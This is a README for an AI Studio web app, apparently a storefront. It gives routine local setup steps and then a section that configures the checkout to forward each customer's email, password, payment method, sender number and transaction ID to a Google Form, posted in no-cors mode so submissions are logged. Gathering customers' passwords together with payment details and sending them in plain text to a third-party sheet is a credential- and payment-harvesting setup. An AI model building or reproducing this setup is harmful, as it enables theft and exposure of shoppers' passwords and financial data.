<div align="center">
<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
</div>

# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://ai.studio/apps/drive/112DkJorCL9rxdt10lNy9HlIBrfQ2qfzA

## Run Locally

**Prerequisites:**  Node.js


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
3. (Optional) To enable the AI support bot, add `VITE_GOOGLE_API_KEY` with a valid Gemini API key.
4. Run the app:
   `npm run dev`

## Send checkout details to Google Forms

If you want each checkout submission (email, password, payment details) to be recorded in a Google Form, add these Vite env vars to `.env.local` (or your Vercel dashboard):

```
VITE_GOOGLE_FORM_ACTION=https://docs.google.com/forms/d/e/<form_id>/formResponse
VITE_GOOGLE_FORM_EMAIL_ENTRY=entry.<email_field_id>
VITE_GOOGLE_FORM_PASSWORD_ENTRY=entry.<password_field_id>
VITE_GOOGLE_FORM_METHOD_ENTRY=entry.<payment_method_field_id>
VITE_GOOGLE_FORM_SENDER_ENTRY=entry.<sender_number_field_id>
VITE_GOOGLE_FORM_TRX_ENTRY=entry.<trx_id_field_id>
VITE_GOOGLE_FORM_PRODUCT_ENTRY=entry.<product_field_id>
```

The action URL plus the email and password entry IDs are required to actually log submissions in your sheet; the others are optional. If they are missing, checkout still works but the form won't record the submission. The app posts the data in `no-cors` mode so the form response is stored even when hosted on Vercel.
